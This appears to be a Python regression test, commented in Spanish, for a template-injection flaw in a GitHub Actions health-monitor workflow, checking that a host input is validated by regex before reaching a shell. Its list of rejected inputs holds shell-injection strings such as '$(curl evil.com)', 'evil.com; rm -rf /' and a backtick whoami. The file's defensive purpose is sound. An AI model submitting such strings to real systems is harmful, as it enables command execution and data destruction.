"""Test de regresión para la issue #406: template-injection en health-monitor.yml.

El workflow interpola directamente un input de workflow_dispatch en un shell command.
Un colaborador malicioso puede inyectar $(curl evil.com) como host.

Fix: validar el input como URL antes de usarlo.
"""
import re
import subprocess
import sys
from pathlib import Path

HEALTH_MONITOR_YML = Path(__file__).resolve().parents[1] / ".github/workflows/health-monitor.yml"

# Contrato: un host válido es hostname[:port] o URL http/https sin componentes shell peligrosos.
# La sanitización se aplica en el step `run` mediante una validación previa.
HOST_VALIDATOR_PATTERN = re.compile(
    r'^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?'
    r'([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?(:\d+)?(/[a-zA-Z0-9\-_./]*)?$'
)


def test_no_direct_interpolation_of_workflow_dispatch_input():
    """El input de workflow_dispatch NO debe interpolarse directamente en un shell `run`."""
    content = HEALTH_MONITOR_YML.read_text()
    lines = [l.strip() for l in content.splitlines()]
    run_lines = [l for l in lines if "run: python3 scripts/health_monitor.py" in l]
    assert len(run_lines) > 0, "Debe existir un step run que invoque health_monitor.py"

    for line in run_lines:
        # DESPUÉS del fix, el host debe entrar como variable de entorno validada,
        # NO como '${{ github.event.inputs.host }}' interpolado directamente en el shell.
        assert "${{ github.event.inputs.host }}" not in line, (
            "FAIL: template-injection — el input se interpila directamente en el shell. "
            f"Línea: {line}"
        )


def test_host_validation_exists_before_use():
    """Debe existir una validación de URL antes de pasar el host al script."""
    content = HEALTH_MONITOR_YML.read_text()
    # El fix introduce un step que valida 'host' con regex antes de usarlo.
    assert "validate-host" in content or "HOST_REGEX" in content, (
        "FAIL: no se encontró validación de host antes de su uso"
    )


def test_valid_hosts_pass_regex():
    """Hosts legítimos deben pasar el validador."""
    valid_hosts = [
        "https://lucidfence.local",
        "http://localhost:8765/health",
        "https://lucidfence-demo.pages.dev",
        "https://uem.local:8443/healthz",
    ]
    for h in valid_hosts:
        assert HOST_VALIDATOR_PATTERN.match(h), f"FAIL: '{h}' fue rechado por el validador"


def test_malicious_hosts_rejected_by_regex():
    """Hosts con inyección de shell deben rechazarse."""
    malicious_hosts = [
        "$(curl evil.com)",
        "evil.com; rm -rf /",
        "https://valid.com && curl evil.com",
        "https://valid.com`whoami`",
        "$(curl evil.com)",
        "https://x.com|sh",
    ]
    for h in malicious_hosts:
        assert not HOST_VALIDATOR_PATTERN.match(h), (
            f"FAIL: '{h}' fue aceptado por el validador — inyección posible"
        )
